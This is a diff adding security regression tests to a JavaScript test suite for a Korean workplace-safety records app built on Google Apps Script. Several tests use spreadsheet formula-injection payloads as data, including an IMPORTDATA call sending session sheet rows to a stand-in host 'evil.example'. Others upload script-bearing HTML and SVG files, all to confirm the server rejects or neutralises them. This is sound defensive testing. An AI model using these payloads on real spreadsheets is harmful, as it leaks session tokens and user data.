@@ -308,7 +308,47 @@ await step('사업장 boot — 자기 사업장만, 다른 사업장 토큰·사
   assert(idx.every((r) => r.site === SITE1), 'index 에 다른 사업장 기록이 있습니다');
 });
 
-const F07_DATA = () => ({
+/* 양식 정의(FD)로 서버 검사(필수 칸·점검표·표 최소 행·사진 장수)를 통과하는 data 를 만든다. 단계형이면 upto 단계까지. */
+const FD = JSON.parse(formsHtml.slice(formsHtml.indexOf('{'), formsHtml.lastIndexOf('}') + 1));
+const formOf = (code) => FD.forms.find((f) => f.code === code);
+function sampleVal(f) {
+  const opt = Array.isArray(f.options) && f.options.length ? f.options[0] : '';
+  switch (f.type) {
+    case 'number': return f.min != null ? f.min : 0;
+    case 'date': return TODAY;
+    case 'datetime': return TODAY + 'T08:00';
+    case 'time': return '08:00';
+    case 'bool': return true;
+    case 'select': return opt || '해당없음';
+    case 'multi': return [opt || '해당없음'];
+    case 'people': return ['김현장'];
+    case 'person': return '김현장';
+    case 'photo': return 'FILE-TEST';
+    case 'computed': return undefined;
+    default: return '확인함';
+  }
+}
+function validData(code, base = {}, upto = Infinity) {
+  const def = formOf(code);
+  const d = {};
+  const stageOf = {};
+  (def.stages || []).forEach((st, i) => (st.sections || []).forEach((sid) => { if (stageOf[sid] === undefined) stageOf[sid] = i; }));
+  const put = (f) => { if (f && f.required && f.type !== 'computed') { const v = sampleVal(f); if (v !== undefined) d[f.id] = v; } };
+  (def.header || []).forEach(put);
+  for (const s of def.sections || []) {
+    if (def.stages && (stageOf[s.id] || 0) > upto) continue;
+    if (s.type === 'fields') (s.fields || []).forEach(put);
+    if (s.type === 'checklist') d[s.id] = Object.fromEntries((s.items || []).map((it) => [it.code, { r: '양호' }]));
+    if (s.type === 'table') d[s.id] = Array.from({ length: s.minRows || 0 }, (x, i) => {
+      const row = { _k: 'r' + i };
+      (s.columns || []).forEach((c) => { if (c.required && c.type !== 'computed') row[c.id] = sampleVal(c); });
+      return row;
+    });
+    if (s.type === 'photos' && s.minCount) d[s.id] = Array.from({ length: s.minCount }, (x, i) => ({ file: 'FILE-T' + i }));
+  }
+  return Object.assign(d, base);
+}
+const F07_DATA = () => validData('F07', {
   checkTime: '08:30', attend: 12, healthChecked: 12, weather: '맑음', tempAir: 14,
   tbmTime: '07:50', tbmTarget: 12, nightSolo: 0, accidentCount: 0, nearMissCount: 0
 });
@@ -327,7 +367,8 @@ await step('(사업장) records.save F07 임시저장 — id 발급·작성중',
 
 await step('(사업장) records.submit — 조치 후보 1건 포함', () => {
   const r = need(S.rec, '임시저장 기록');
-  const data = Object.assign(F07_DATA(), { sec_items: { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하' } } });
+  const data = F07_DATA();
+  data.sec_items = Object.assign({}, data.sec_items, { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하' } });
   const facts = { v: { attend: 12, healthChecked: 12, weather: '맑음', accidentCount: 0, nearMissCount: 0 }, t: {}, k: { sec_items: { D01: '양호', D02: '불량' } }, sm: [12, 0, 0] };
   const cand = { key: `${r.id}#sec_items#D02`, srcItem: 'D02', title: '소화기 압력 저하', detail: '2층 소화기 압력 저하', level: '높음', due: addDays(TODAY, 3), owner: '김현장', photo: null };
   const d = ok(api('records.submit', { record: Object.assign({}, r, { data, facts }), acts: [cand] }, S.site1), 'records.submit');
@@ -374,7 +415,7 @@ await step('(본사) records.review 반려 — 사유·사업장 메일', () => 
 await step('(사업장) 고쳐 다시 제출 — rev 2, 조치 중복 없음', () => {
   const r = need(S.rec, '반려 기록');
   const full = ok(api('records.get', { id: r.id }, S.site1), 'records.get');
-  const data = Object.assign({}, full.data, { handoverNote: '소화기 교체 요청함', sec_items: { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하', photo: 'FILE-TEST' } } });
+  const data = Object.assign({}, full.data, { handoverNote: '소화기 교체 요청함', sec_items: Object.assign({}, full.data.sec_items, { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하', photo: 'FILE-TEST' } }) });
   const d = ok(api('records.submit', { record: Object.assign({}, full, { data }), acts: [need(S.cand, '조치 후보')] }, S.site1), 'records.submit(재제출)');
   eq(d.record.status, '제출', 'status');
   eq(Number(d.record.rev), 2, 'rev');
@@ -664,6 +705,243 @@ await step('setup·installTriggers·cron — 익명 웹앱 방문자 호출은 �
   const login = JSON.parse(c3.api('auth.login', JSON.stringify({ id: 'admin', password: 'Hacker123' }), ''));
   eq(login.ok, false, '공격자 비밀번호 로그인');
   return '익명 setup 거부 · 설치 후 {already:true}';
+});
+
+/* ---------------- 감사 지적 회귀 시험(보안·무결성) ---------------- */
+const FORMULA_LEAD = /^[=+\-@\t\r\n]/;
+function badCells(names, bookId) {
+  const out = [];
+  for (const n of names) {
+    for (const row of mock.table(n, bookId)) {
+      for (const [k, v] of Object.entries(row)) if (typeof v === 'string' && FORMULA_LEAD.test(v)) out.push(`${n}.${k}=${v.slice(0, 30)}`);
+    }
+  }
+  return out;
+}
+const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
+const yes = (v) => v === true || v === 'true' || v === 'Y';
+
+await step('(보안) 숫자·날짜·시각 칸에 글자 → INVALID, 빈 기록 제출 → INVALID', () => {
+  const site = need(S.site1, '사업장 세션');
+  const base = { form: 'F07', site: SITE1, date: addDays(TODAY, -3), period: addDays(TODAY, -3), shift: '주간', author: '김현장' };
+  const evil = '+IMPORTDATA("https://evil.example/?x="&JOIN(",",sessions!A2:A9))';
+  const r1 = denied(api('records.submit', { record: Object.assign({}, base, { data: Object.assign(F07_DATA(), { attend: evil }) }), acts: [] }, site), ['INVALID'], '숫자 칸에 수식 글자');
+  assert(/숫자/.test(r1.error), '오류 문장에 숫자 안내가 없습니다: ' + r1.error);
+  denied(api('records.save', { record: Object.assign({}, base, { data: Object.assign(F07_DATA(), { checkTime: '+users!F2' }) }) }, site), ['INVALID'], '시각 칸에 수식 글자(임시저장)');
+  denied(api('records.submit', { record: Object.assign({}, base, { data: {} }), acts: [] }, site), ['INVALID'], '빈 data 제출');
+  return '거부 확인';
+});
+
+await step('(보안) 글자 칸의 +,-,@,= 값은 V_ 시트·재구축·내보내기에서 글자로(수식 아님)', () => {
+  const site = need(S.site1, '사업장 세션');
+  const rec = { form: 'F07', site: SITE1, date: addDays(TODAY, -3), period: addDays(TODAY, -3), shift: '주간', author: '-김현장',
+    data: Object.assign(F07_DATA(), { handoverNote: '+IMPORTXML("https://evil.example","//a")', workerVoice: '@SUM(1)', tbmTopic: '=1+1', heatPlace: '-users!F2' }) };
+  const d = ok(api('records.submit', { record: rec, acts: [] }, site), 'records.submit(수식 글자)');
+  S.evilRec = d.record.id;
+  const vNames = mock.sheetNames().filter((n) => /^V_/.test(n));
+  assert(vNames.length, 'V_ 시트가 없습니다');
+  let bad = badCells(vNames);
+  assert(!bad.length, '제출 직후 V_ 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
+  // 숫자·날짜 열에 들어간 글자도(이관 등 검사 밖 경로) 따옴표로 글자 처리되는지 — 재구축으로 확인
+  const imp = Object.assign({}, rec, { id: `ID-${SITE1}-${YYMMDD}-90`, status: '제출', rev: 1, stageDone: [], createdBy: 'site', submittedAt: '+1+1', createdAt: TODAY + 'T08:00:00', updatedAt: TODAY + 'T08:00:00',
+    data: Object.assign(F07_DATA(), { attend: '-1+users!F2', healthChecked: '+sessions!A2' }), facts: {} });
+  ok(api('admin.importBulk', { records: [imp] }, need(S.hq, '본사 토큰')), 'importBulk(검사 밖 값)');
+  ok(api('admin.rebuildViews', {}, S.hq), 'rebuildViews');
+  bad = badCells(mock.sheetNames().filter((n) => /^V_/.test(n)));
+  assert(!bad.length, '재구축 뒤 V_ 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
+  const ex = ok(api('export.sheet', { kind: 'form', form: 'F07' }, S.hq), 'export.sheet(form)');
+  const bookId = /\/d\/([^/]+)/.exec(ex.url)[1];
+  bad = badCells(mock.sheetNames(bookId), bookId);
+  assert(!bad.length, '내보내기 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
+  ok(api('records.delete', { id: imp.id, reason: '시험 정리' }, S.hq), '정리');
+  return `V_ 시트 ${vNames.length}개 · 내보내기 시트 ${mock.sheetNames(bookId).length}개`;
+});
+
+await step('(권한) F10 본사 전용 단계 — 사업장은 제출·덮어쓰기 불가, 비공개 칸은 읽기에서 빠짐', () => {
+  const site = need(S.site1, '사업장 세션'), hq = need(S.hq, '본사 토큰');
+  const base = { form: 'F10', site: SITE1, date: TODAY, period: '', author: '김현장' };
+  const s1 = ok(api('records.submit', { record: Object.assign({}, base, { data: validData('F10', {}, 0) }), stageId: 's1', acts: [] }, site), 'F10 s1');
+  const id = s1.record.id;
+  const sneak = { d30Status: '같은 사업장 근무 중', d30By: '김현장', closeNote: '사업장이 쓴 종결 의견', raNeed: '아니오', naReason: '불필요' };
+  ok(api('records.submit', { record: { id, data: validData('F10', sneak, 1) }, stageId: 's2', acts: [] }, site), 'F10 s2(본사 칸 끼워 넣기)');
+  let h = ok(api('records.get', { id }, hq), 'records.get(본사)');
+  for (const k of Object.keys(sneak)) assert(h.data[k] === undefined, `사업장이 끼워 넣은 본사 칸 ${k} 가 저장됐습니다`);
+  denied(api('records.submit', { record: { id, data: h.data }, stageId: 's3', acts: [] }, site), ['FORBIDDEN'], '사업장 s3 제출');
+  // 본사가 s3·s4 를 끝낸다
+  const hqData = Object.assign(validData('F10', {}, 3), h.data, { raNeed: '예', naReason: '', hqOpinion: '본사 내부 의견', d30Method: '본사 대면 면담', d30By: '박본사', d30Status: '회사 사정으로 이동', closeNote: '본사 내부 메모' });
+  const facts = { v: { swType: hqData.swType, raNeed: '예', d30Method: '본사 대면 면담' }, t: { sec_measures: { n: 1 } }, k: { sec_d30check: { A1: '양호' } }, sm: [] };
+  ok(api('records.submit', { record: { id, data: hqData, facts }, stageId: 's3', acts: [] }, hq), 'F10 s3(본사)');
+  const fin = ok(api('records.submit', { record: { id, data: hqData, facts }, stageId: 's4', acts: [] }, hq), 'F10 s4(본사)');
+  eq(fin.record.status, '제출', '본사 s4 뒤 status');
+  // 사업장 읽기: 비공개 칸 없음(기록·색인 facts 모두)
+  const sg = ok(api('records.get', { id }, site), 'records.get(사업장)');
+  for (const k of ['d30Status', 'd30By', 'd30Method', 'closeNote', 'naReason', 'hqOpinion', 'sec_d30check', 'sec_measures']) assert(!(k in sg.data), `사업장 records.get 에 비공개 칸 ${k} 가 보입니다`);
+  const bg = ok(api('records.bulkGet', { ids: [id] }, site), 'records.bulkGet(사업장)');
+  assert(!('d30Status' in bg[0].data), '사업장 bulkGet 에 d30Status 가 보입니다');
+  const row = ok(api('boot', {}, site), 'boot(사업장)').index.find((x) => x.id === id);
+  assert(row && !('d30Method' in (row.facts.v || {})) && !('sec_d30check' in (row.facts.k || {})) && !('sec_measures' in (row.facts.t || {})), '사업장 색인 facts 에 비공개 값이 보입니다: ' + JSON.stringify(row && row.facts));
+  // 사업장 재제출: 끝난 본사 단계 → 거부, s1 수정 보고 → 본사 칸은 그대로
+  denied(api('records.submit', { record: { id, data: Object.assign({}, sg.data, { d30Status: '같은 사업장 근무 중' }) }, stageId: 's4', acts: [] }, site), ['FORBIDDEN'], '사업장이 끝난 s4 재제출');
+  ok(api('records.submit', { record: { id, data: Object.assign({}, sg.data, { d30Status: '같은 사업장 근무 중', closeNote: '' }), facts: { v: { swType: hqData.swType } } }, stageId: 's1', acts: [] }, site), '사업장 s1 수정 보고');
+  h = ok(api('records.get', { id }, hq), 'records.get(본사, 뒤)');
+  eq(h.data.d30Status, '회사 사정으로 이동', 'd30Status(본사 값 유지)');
+  eq(h.data.closeNote, '본사 내부 메모', 'closeNote(본사 값 유지)');
+  eq(h.facts.v.d30Method, '본사 대면 면담', 'facts.v.d30Method(본사 값 유지)');
+  assert(h.facts.k && h.facts.k.sec_d30check, 'facts.k.sec_d30check 가 사라졌습니다');
+  S.f10 = id;
+  return id;
+});
+
+await step('(인증) 잠금 키 분리 — 본사 로그인 폼으로 사업장 PIN·비밀번호 변경을 잠글 수 없음', () => {
+  const hq = need(S.hq, '본사 토큰');
+  ok(api('sites.setPin', { id: SITE2, pin: '4321' }, hq), 'setPin S002');
+  for (let i = 0; i < 6; i++) denied(api('auth.login', { id: 'site:' + SITE2.toLowerCase(), password: 'x' }), ['AUTH'], '본사 폼에 site:S002');
+  for (let i = 0; i < 6; i++) denied(api('auth.login', { id: 'pw:admin', password: 'x' }), ['AUTH'], '본사 폼에 pw:admin');
+  const d = ok(api('auth.siteLogin', { siteToken: need(S.tok2, 'S002 토큰'), pin: '4321', name: '최판교' }), '정상 PIN 로그인');
+  assert(d.token, '토큰 없음');
+  const r = denied(api('auth.changePassword', { old: 'not-the-pw-1', new: 'Another123' }, hq), ['INVALID', 'AUTH'], '틀린 지금 비밀번호');
+  assert(!/잠겼/.test(r.error), '비밀번호 변경이 남이 만든 실패 횟수로 잠겼습니다: ' + r.error);
+  // 본사 아이디 잠금은 그대로 동작
+  for (let i = 0; i < 5; i++) denied(api('auth.login', { id: 'viewer1', password: 'nope' }), ['AUTH'], '틀린 비번');
+  const lk = denied(api('auth.login', { id: 'viewer1', password: 'view1234a' }), ['AUTH'], '잠긴 아이디');
+  assert(/잠겼/.test(lk.error), '5회 실패 뒤 잠기지 않았습니다: ' + lk.error);
+  ok(api('sites.setPin', { id: SITE2, pin: '' }, hq), 'PIN 해제');
+});
+
+await step('(조치) 수정 제출로 양호가 된 항목의 자동 조치 정리(등록=삭제, 진행 중=이력 안내)', () => {
+  const site = need(S.site1, '사업장 세션');
+  const date = addDays(TODAY, -4);
+  const data = F07_DATA();
+  data.sec_items = Object.assign({}, data.sec_items, { D05: { r: '불량', note: '비상구 적치물' }, D06: { r: '주의', note: '조명 깜빡임' } });
+  const s1 = ok(api('records.save', { record: { form: 'F07', site: SITE1, date, period: date, shift: '주간', author: '김현장', data } }, site), 'save');
+  const id = s1.record.id;
+  const cands = ['D05', 'D06'].map((c) => ({ key: `${id}#sec_items#${c}`, srcItem: c, title: c + ' 개선', detail: '', level: c === 'D05' ? '높음' : '보통', due: '', owner: '', photo: null }));
+  const d1 = ok(api('records.submit', { record: { id, data }, acts: cands }, site), '제출(조치 2건)');
+  eq(d1.acts.length, 2, '자동 조치 수');
+  const a5 = d1.acts.find((a) => a.srcItem === 'D05'), a6 = d1.acts.find((a) => a.srcItem === 'D06');
+  ok(api('acts.transition', { id: a6.id, to: '조치중', note: '교체 주문' }, site), 'D06 조치중');
+  const fixed = F07_DATA();
+  const d2 = ok(api('records.submit', { record: { id, data: fixed }, acts: [] }, site), '수정 제출(모두 양호)');
+  eq(Number(d2.record.rev), 2, 'rev');
+  const t5 = mock.table('acts').find((a) => a.id === a5.id), t6 = mock.table('acts').find((a) => a.id === a6.id);
+  assert(yes(t5.deleted), '손대지 않은 D05 조치가 삭제되지 않았습니다');
+  assert(/자동 정리/.test(String(t5.history)), 'D05 이력에 정리 사유가 없습니다');
+  assert(!yes(t6.deleted) && t6.status === '조치중', '진행 중인 D06 조치는 남아야 합니다');
+  assert(/조치 대상이 아님/.test(String(t6.history)), 'D06 이력에 안내가 없습니다');
+  assert(Array.isArray(d2.prunedActs) && d2.prunedActs.some((a) => a.id === a5.id && a.deleted), '응답 prunedActs 에 정리된 조치가 없습니다');
+  ok(api('records.submit', { record: { id, data: fixed }, acts: [] }, site), '한 번 더 수정 제출');
+  const t6b = mock.table('acts').find((a) => a.id === a6.id);
+  eq((String(t6b.history).match(/조치 대상이 아님/g) || []).length, 1, 'D06 안내 이력은 한 번만');
+  return `${a5.id} 삭제 · ${a6.id} 유지`;
+});
+
+await step('(파일) files.put 허용 목록 — html·exe·내용 불일치·깨진 base64 거부', () => {
+  const site = need(S.site1, '사업장 세션');
+  const put = (dataUrl, name, kind) => api('files.put', { dataUrl, name, kind: kind || 'attach' }, site);
+  denied(put('data:text/html ;base64,' + b64('<script>1</script>'), 'a'), ['INVALID'], 'text/html(공백)');
+  denied(put('data:image/png;base64,' + PNG_1PX, '점검표.html'), ['INVALID'], '.html 이름');
+  denied(put('data:image/png;base64,' + PNG_1PX, 'setup.exe'), ['INVALID'], '.exe 이름');
+  denied(put('data:image/svg+xml;base64,' + b64('<svg onload="x"/>'), 'a.svg'), ['INVALID'], 'svg');
+  denied(put('data:image/png;base64,' + b64('<html><script>1</script></html>'), '사진.png', 'photo'), ['INVALID'], 'png 이름에 HTML 내용');
+  denied(put('data:application/pdf;base64,' + PNG_1PX, '보고서.pdf'), ['INVALID'], 'pdf 이름에 png 내용');
+  const bad = denied(put('data:image/png;base64,!!!!', 'x.png', 'photo'), ['INVALID'], '깨진 base64');
+  assert(!/decode/i.test(bad.error), '서버 예외 문장이 그대로 나갑니다: ' + bad.error);
+  const pdf = ok(put('data:application/pdf;base64,' + b64('%PDF-1.4\n%%EOF\n'), '보고서.pdf'), 'pdf');
+  eq(pdf.file.mime, 'application/pdf', 'pdf mime');
+  const ole = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0, 0, 0]).toString('base64');
+  const hwp = ok(put('data:application/octet-stream;base64,' + ole, '안전교육.hwp'), 'hwp(octet-stream)');
+  eq(hwp.file.name, '안전교육.hwp', 'hwp 이름');
+  const sign = ok(put('data:image/png;base64,' + PNG_1PX, '서명-소장', 'sign'), '확장자 없는 서명');
+  eq(sign.file.name, '서명-소장.png', '확장자 붙임');
+  return 'pdf·hwp·png 통과, 나머지 거부';
+});
+
+await step('(범위) 사업장 boot 의 요청 — 다른 사업장·독촉 이력·본사 담당자 이름 숨김', () => {
+  const hq = need(S.hq, '본사 토큰');
+  const req = ok(api('requests.save', { request: { kind: 'form', title: '3곳 대상 요청', message: '제출해 주세요', forms: ['F09'], sites: [SITE1, SITE2, SITE3], due: addDays(TODAY, 5) } }, hq), 'requests.save').request;
+  ok(api('requests.remind', { id: req.id }, hq), 'remind');
+  const all = ok(api('requests.save', { request: { kind: 'notice', title: '전체 공지', message: '공지', sites: ['*'] } }, hq), '전체 공지').request;
+  ok(api('requests.remind', { id: all.id }, hq), 'remind 전체');
+  const b = ok(api('boot', {}, need(S.site1, '사업장 세션')), 'boot(사업장)');
+  for (const r of b.requests) {
+    assert(deepEq(r.sites, ['*']) || deepEq(r.sites, [SITE1]), `요청 ${r.id} sites 에 다른 사업장이 보입니다: ${JSON.stringify(r.sites)}`);
+    const sent = (r.remind && r.remind.sent) || {};
+    assert(Object.keys(sent).every((k) => k === SITE1), `요청 ${r.id} 독촉 이력에 다른 사업장: ${JSON.stringify(sent)}`);
+    eq(r.createdBy, '본사', '요청 작성자');
+  }
+  assert(b.requests.some((r) => r.id === req.id), '3곳 대상 요청이 사업장에 안 보입니다');
+  const hb = ok(api('boot', {}, hq), 'boot(본사)').requests.find((r) => r.id === req.id);
+  eq(hb.sites.length, 3, '본사에는 대상 사업장 3곳 그대로');
+  S.req3 = req;
+});
+
+await step('(남용) 사업장 세션·열람 표시·인원 상한, viewer 열람 표시 거부', () => {
+  for (let i = 0; i < 12; i++) ok(api('auth.siteLogin', { siteToken: need(S.tok1, '사업장 토큰'), name: '반복로그인' }), 'siteLogin');
+  const n = mock.table('sessions').filter((r) => r.site === SITE1 && r.name === '반복로그인').length;
+  assert(n <= 5, `같은 이름 세션이 ${n}개 남았습니다(최대 5)`);
+  ok(api('boot', {}, need(S.site1, '사업장 세션')), '다른 이름 세션은 그대로');
+  const before = mock.table('reads').length;
+  for (let i = 0; i < 5; i++) denied(api('reads.mark', { refId: 'junk-' + i }, S.site1), ['NOTFOUND'], '없는 대상 열람 표시');
+  denied(api('reads.mark', { refId: 'ID-NOPE-000000-01#s1' }, S.hq), ['NOTFOUND'], '없는 기록 단계 확인 표시');
+  eq(mock.table('reads').length, before, 'reads 행 수');
+  const v = ok(api('auth.login', { id: 'admin', password: PW }), '관리자 로그인');
+  ok(api('users.save', { user: { id: 'viewer2', name: '열람2', role: 'viewer', email: 'v2@hds.test', active: true }, password: 'view2345a' }, v.token), 'viewer2');
+  const vt = ok(api('auth.login', { id: 'viewer2', password: 'view2345a' }), 'viewer2 로그인').token;
+  denied(api('reads.mark', { refId: need(S.req, '요청').id }, vt), ['FORBIDDEN'], 'viewer 열람 표시');
+  const rows = Array.from({ length: 1001 }, (x, i) => ({ name: '인원' + i }));
+  denied(api('people.bulk', { site: SITE1, rows }, S.site1), ['INVALID'], '1,001명 한 번에');
+  return `같은 이름 세션 ${n}개`;
+});
+
+await step('(삭제) 반려된 단계 보고(F04 속보)는 사업장이 지울 수 없음', () => {
+  const site = need(S.site1, '사업장 세션');
+  const d = ok(api('records.submit', { record: { form: 'F04', site: SITE1, date: TODAY, period: '', author: '김현장', data: validData('F04', {}, 0) }, stageId: 's1', acts: [] }, site), 'F04 s1');
+  ok(api('records.review', { id: d.record.id, decision: '반려', note: '피해 정도를 다시 적어 주세요' }, need(S.hq, '본사 토큰')), '반려');
+  denied(api('records.delete', { id: d.record.id, reason: '' }, site), ['FORBIDDEN'], '반려된 단계 보고 삭제');
+  const left = mock.table('records').find((r) => r.id === d.record.id);
+  assert(!yes(left.deleted), '기록이 지워졌습니다');
+});
+
+await step('(제출 시각) 반려 뒤 다시 제출하면 submittedAt 갱신, 이전 시각은 감사 기록에', () => {
+  const hq = need(S.hq, '본사 토큰');
+  const id = `ID-${SITE1}-261019-01`;
+  const old = '2026-10-20T07:16:00';
+  ok(api('admin.importBulk', { records: [{ id, form: 'F07', formVersion: 'v2.0', site: SITE1, date: '2026-10-19', period: '2026-10-19', shift: '주간', status: '반려', stageDone: [], author: '김현장', rev: 1, createdBy: 'site', requestId: '',
+    createdAt: old, updatedAt: '2026-10-20T17:15:00', submittedAt: old, returnedAt: '2026-10-20T17:15:00', returnedBy: '본사', returnNote: '사진 첨부', data: F07_DATA(), facts: {} }] }, hq), 'importBulk(반려 기록)');
+  const d = ok(api('records.submit', { record: { id, data: F07_DATA() }, acts: [] }, need(S.site1, '사업장 세션')), '다시 제출');
+  assert(d.record.submittedAt > '2026-10-20T17:15:00', `submittedAt 이 갱신되지 않았습니다: ${d.record.submittedAt}`);
+  const lg = ok(api('admin.log', { kind: 'submit', limit: 20 }, hq), 'admin.log');
+  assert(lg.some((x) => x.ref === id && /이전 제출 2026-10-20 07:16/.test(x.text)), '감사 기록에 이전 제출 시각이 없습니다');
+});
+
+await step('(조치) 사업장은 기한·위험 수준을 못 바꾸고, 본사 변경은 이력에 전후 값', () => {
+  const site = need(S.site1, '사업장 세션'), hq = need(S.hq, '본사 토큰');
+  const a = ok(api('acts.save', { act: { site: SITE1, title: '난간 보수', level: '높음', due: addDays(TODAY, -1) } }, hq), '본사 등록').act;
+  denied(api('acts.transition', { id: a.id, to: '보류', note: '자재 대기', due: '2027-12-31' }, site), ['FORBIDDEN'], '사업장 전이로 기한 연장');
+  denied(api('acts.save', { act: { id: a.id, level: '낮음' } }, site), ['FORBIDDEN'], '사업장 수준 낮춤');
+  denied(api('acts.save', { act: { id: a.id, due: '2027-12-31' } }, site), ['FORBIDDEN'], '사업장 기한 연장');
+  ok(api('acts.transition', { id: a.id, to: '조치중', note: '착수' }, site), '사업장 일반 전이는 허용');
+  const t = ok(api('acts.transition', { id: a.id, to: '보류', note: '자재 대기', due: addDays(TODAY, 10) }, hq), '본사 기한 변경').act;
+  assert(JSON.stringify(t.history).includes('기한 ' + addDays(TODAY, -1) + ' → ' + addDays(TODAY, 10)), '전이 이력에 기한 전후 값이 없습니다');
+  const s = ok(api('acts.save', { act: { id: a.id, level: '보통' } }, hq), '본사 수준 변경').act;
+  assert(JSON.stringify(s.history).includes('위험 수준 높음 → 보통'), '수정 이력에 수준 전후 값이 없습니다');
+});
+
+await step('(설치) 실행 계정을 못 읽으면 setup·cron 거부(실패 시 닫힘)', () => {
+  const ident = { autoSave: false, formsHtml, htmlFiles: htmlFileNames(SRC_DIR), log: sink, activeUserEmail: '', effectiveUserEmail: '' };
+  const c4 = vm.createContext({ console: sink });
+  vm.runInContext(mockSrc, c4, { filename: 'gas-mock.js' });
+  const m4 = c4.createGasMock(ident);
+  Object.assign(c4, m4.globals);
+  for (const f of files) vm.runInContext(f.src, c4, { filename: f.name });
+  let threw = false;
+  try { c4.setup({ adminPassword: 'Anon12345' }); } catch (e) { threw = true; }
+  assert(threw, '신원 불명 setup 이 거부되지 않았습니다');
+  assert(!m4.globals.PropertiesService.getScriptProperties().getProperty('DB_ID'), '신원 불명 setup 이 DB 를 만들었습니다');
+  eq(JSON.stringify(c4.installTriggers()), '{"already":true}', '신원 불명 installTriggers');
+  m4.globals.PropertiesService.getScriptProperties().setProperty('ALLOW_SETUP', '1');
+  const r = c4.setup({ adminPassword: 'Owner12345', triggers: false });
+  assert(r && r.dbUrl, 'ALLOW_SETUP=1 이면 setup 이 돼야 합니다');
 });
 
 await step('영속 왕복 — 저장 후 새 모의에서 로그인·조회', () => {
